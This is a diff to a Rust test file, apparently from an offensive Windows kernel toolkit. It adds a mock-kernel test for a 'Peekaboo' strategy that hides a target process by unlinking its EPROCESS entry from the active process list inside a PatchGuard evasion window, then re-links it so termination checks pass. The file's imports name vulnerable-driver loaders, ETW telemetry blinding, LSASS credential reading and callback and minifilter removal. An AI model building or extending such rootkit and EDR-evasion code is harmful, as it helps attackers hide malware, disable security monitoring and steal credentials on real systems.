@@ -15,7 +15,9 @@
 //!   the reference `minidump` crate.
 //! - **Chain (c) — PatchGuard window + offsets table**: patch-equivalent
 //!   build fallback → capability-driven PG window selection (thread-suspend
-//!   vs timing-repair) → DKOM edits inside the window → guard-Drop repair.
+//!   vs timing-repair) → DKOM edits inside the window → guard-Drop repair;
+//!   plus the preferred offset-free Peekaboo strategy (hide preserving links
+//!   → guard-Drop re-link).
 //!
 //! All kernel state lives in sparse byte maps; no real driver, no real
 //! kernel, no network. Runs on the macOS dev host and under wine64.
@@ -25,7 +27,10 @@ use crate::byovd_drivers::{Iqvw64e, RtCore64, Shield, WdtKernel};
 use crate::etwti::{EtwTiBlind, EtwTiOffsets};
 use crate::netsec::{KernelLsassReader, DIRECTORY_TABLE_BASE};
 use crate::offsets::{EprocessOffsets, PgContextOffsets, RuntimeOffsets};
-use crate::persistence::{ProcessHider, PplStripper, RuntimePgBypassWindow, TimingRepairWindow};
+use crate::persistence::{
+    PeekabooProbe, PeekabooWindow, PplStripper, ProcessHider, RuntimePgBypassWindow,
+    TimingRepairWindow,
+};
 use crate::telemetry::{CallbackNeutralizer, MiniFilterUnlinker};
 use crate::{
     CallbackKit, CredKit, EtwTiKit, KernelRw, KitError, KrwError, MiniFilterKit, PatchGuardKit,
@@ -732,6 +737,70 @@ fn pg_window_offsets_table_integrated_dkom_chain() {
         ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc),
         Err(KitError::NotFound)
     ));
+}
+
+/// Mock validation-trigger probe for the Peekaboo window (stands in for the
+/// real PsSetCreateProcessNotifyRoutineEx-callback driver seam).
+struct MockPeekabooProbe {
+    active: bool,
+    armed: bool,
+}
+impl PeekabooProbe for MockPeekabooProbe {
+    fn validation_active(&self) -> Result<bool, KitError> {
+        Ok(self.active)
+    }
+    fn repair_armed(&self) -> Result<bool, KitError> {
+        Ok(self.armed)
+    }
+}
+
+/// The offset-free PeekabooWindow is tier 1 of `select_pg_window_with_probe`
+/// (preferred whenever the operator has a kernel callback seam): it covers a
+/// DKOM hide for its whole lifetime and re-links on guard Drop, so
+/// PspProcessDelete's bidirectional LIST_ENTRY check passes at termination —
+/// all while the PG-context windows stay gated OFF (placeholder offsets).
+#[test]
+fn peekaboo_preferred_window_hides_and_repairs_on_drop() {
+    let eproc = crate::offsets::for_build(19041).unwrap().offsets;
+    let kernel = FakeKernel::new();
+    let rw = VaRw(&kernel);
+    build_process_list(&kernel, PS_HEAD_C, &[(E_SYS, 4), (E_TARGET, 4242)], &eproc);
+
+    // Tiers 2–3 are unreachable here (verified-offsets gate OFF) — Peekaboo
+    // is the selected strategy (the win-side selection tests pin the actual
+    // probe order under wine64).
+    assert!(!crate::offsets::pg_context_usable_for_window(19041));
+    let probe = MockPeekabooProbe {
+        active: false,
+        armed: true,
+    };
+    let window = PeekabooWindow::new(eproc, &probe, &rw);
+
+    // ---- DKOM hide INSIDE the window (link-preserving unlink + track) -----
+    {
+        let _guard = window
+            .enter_unchecked(&rw)
+            .expect("no validation racing + repair armed → window opens");
+        PeekabooWindow::unlink_preserving_links(&rw, E_TARGET, &eproc)
+            .expect("hide preserving neighbor pointers");
+        window.track_hidden(E_TARGET);
+        assert!(matches!(
+            ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc),
+            Err(KitError::NotFound)
+        ));
+    } // guard Drop → repair_links re-inserts the hidden entry
+
+    // ---- End state: list consistency restored (the PspProcessDelete check) --
+    assert_eq!(
+        ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc).unwrap(),
+        E_TARGET,
+        "repair re-linked the entry — enumerable again after window close"
+    );
+    let link = E_TARGET + eproc.active_process_links;
+    let flink = kernel.read_u64(link) as usize;
+    let blink = kernel.read_u64(link + 8) as usize;
+    assert_eq!(kernel.read_u64(flink + 8) as usize, link, "Flink->Blink == entry");
+    assert_eq!(kernel.read_u64(blink) as usize, link, "Blink->Flink == entry");
 }
 
 #[test]
